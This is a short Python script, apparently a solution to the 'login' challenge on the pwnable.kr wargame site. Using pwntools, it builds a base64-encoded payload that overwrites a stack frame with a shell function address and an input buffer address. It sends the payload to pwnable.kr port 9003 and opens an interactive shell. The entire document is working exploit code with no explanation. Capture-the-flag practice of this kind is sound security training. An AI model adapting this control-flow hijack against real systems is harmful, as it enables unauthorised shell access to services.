from pwn import *

shell = 0x08049284
input_addr = 0x0811EB40

p = remote('pwnable.kr', 9003)

payload = base64.b64encode(b'AAAA' + p32(shell) + p32(input_addr))
p.sendline(payload)

p.interactive()
